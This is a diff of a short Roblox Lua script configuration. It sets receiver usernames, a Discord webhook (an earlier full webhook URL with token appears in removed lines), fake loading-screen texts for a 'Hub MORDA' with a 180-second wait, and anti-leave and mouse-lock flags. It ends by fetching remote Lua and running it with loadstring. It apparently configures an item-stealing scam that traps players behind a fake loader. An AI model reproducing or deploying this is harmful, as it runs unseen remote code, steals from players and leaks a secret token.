@@ -1,5 +1,16 @@
 UserName = "PogrzaloCie"
 UserName2 = "PogrzaloCie"
-Webhook = "https://discord.com/api/webhooks/1097137558611304598/Cfr-HA3Ge-FfBVZ5nF9gk5ALFW3PNZbn4NlT0eHNj1idkgvF0sYdRvRLMu5fa0IO9p9Z" 
- 
-loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
+Webhook = "webhook here"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+
+_G.ScriptName = "Hub MORDA"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
